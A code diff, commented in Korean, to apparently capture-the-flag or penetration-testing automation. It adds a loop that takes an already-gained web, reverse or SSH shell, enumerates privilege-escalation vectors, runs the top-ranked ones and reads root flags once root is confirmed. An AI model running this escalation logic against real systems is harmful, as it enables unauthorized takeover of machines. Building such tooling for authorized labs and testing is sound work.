@@ -170,8 +170,64 @@ class FootholdMixin:
                 prov = _prov.FlagProvenance(kind, val, "<발판 세션 직독>", "foothold",
                                             "exploit-derived", "발판 세션에서 직접 읽음")
                 self._record_flag(report, FlagHit(val, kind, "발판"), prov)
+            # 권한상승 폐루프(발판 세션 위) — SSH 전용이던 폐루프를 '획득한 발판 세션'에도 적용해
+            # 일반화(웹/리버스셸 발판 포함). 열거→랭킹→HIGH 벡터 실행→uid=0→root.txt.
+            self._privesc_loop(session, report)
         except OSError as e:   # 세션 소켓/전송 오류 → 발판 중단(이후 준비 스테이지는 계속)
             self.audit.event("foothold_session_error", error=f"{type(e).__name__}: {e}")
+
+    def _privesc_loop(self, session, report) -> None:
+        """획득한 발판 세션 위에서 권한상승을 자동 시도한다(생성→실행 폐루프, 세션 무관).
+
+        ① privesc 열거(PRIVESC_ENUM) 실행 → 출력 코퍼스 ② privesc_analyze 로 HIGH 벡터 랭킹
+        ③ 상위 벡터의 비대화형(one-shot) 상승을 실행해 uid=0 확인 ④ 성립 시 world 를 root 로
+        전이하고 /root/root.txt 를 읽어 플래그 기록. 어떤 단계든 미성립/실패면 조용히 종료
+        (발판·user 플래그는 유지). _exploit_exec_stage(SSH)와 동일 로직의 '세션 무관' 버전 —
+        이전엔 SSH 발판에만 폐루프가 걸려, 웹셸/리버스셸로 들어온 박스는 privesc 가 수동이었다.
+        실행은 '이미 획득한 셸' 위에서만 일어난다(새 범위 밖 대상 접촉 없음). 인가 대상 전용."""
+        if self.world is None or self.world.has_access("root"):
+            return
+        from .orchestrator import EnumFinding
+        from .privesc_analyze import analyze_enum
+        from .target_shell import PRIVESC_ENUM
+        try:
+            # ① 열거 — 코퍼스에 반영(벡터 랭킹 재료)
+            for rc in PRIVESC_ENUM:
+                if self._goal_reached(report) or self._time_up():
+                    return
+                out = session.run(rc)
+                report.enum_findings.append(
+                    EnumFinding(command=f"[발판 privesc 열거] {rc}", phase="privesc",
+                                output=out, ran=True))
+            # ② 랭킹(HIGH 벡터만)
+            corpus = "\n".join(f.output for f in report.enum_findings if f.output)
+            vectors = [v for v in analyze_enum(corpus) if v.confidence == "high"]
+            # ③ HIGH 벡터 실행 — 비대화형(one-shot) 우선(프레이밍 채널에서 대화형 셸 스폰 회피)
+            for v in vectors[:3]:
+                if self._goal_reached(report) or self._time_up():
+                    return
+                probe = v.oneshot("id") or ((v.plan.splitlines()[0] + "; id") if v.plan else "")
+                if not probe:
+                    continue
+                out = session.run(probe)
+                report.enum_findings.append(
+                    EnumFinding(command=f"[발판 privesc 시도] {v.kind}:{v.binary}",
+                                phase="privesc", output=out, ran=True))
+                if "uid=0(root)" in out:
+                    self.world.raise_access("root")
+                    self.audit.event("privesc_root", via=v.kind, binary=v.binary,
+                                     channel=getattr(session, "kind", "?"))
+                    # ④ root 전이 후 플래그 재읽기(세션 직독, provenance=privesc)
+                    from . import flag_read
+                    for kind, val in flag_read.read_flags(
+                            session, flag_kind=self.flag_kind).items():
+                        prov = _prov.FlagProvenance(kind, val, "<발판 privesc 후 직독>", "privesc",
+                                                    "exploit-derived",
+                                                    "권한상승 후 발판 세션에서 직접 읽음")
+                        self._record_flag(report, FlagHit(val, kind, "privesc"), prov)
+                    return
+        except OSError as e:   # 세션 소켓/전송 오류 → privesc 중단(발판·user 플래그 유지)
+            self.audit.event("privesc_session_error", error=f"{type(e).__name__}: {e}")
 
     def _acquire_session(self, report, host):
         """발판 세션 획득 + 성립 검증. --exploit-exec/--auto-poc 전용(RCE 실행 표면).
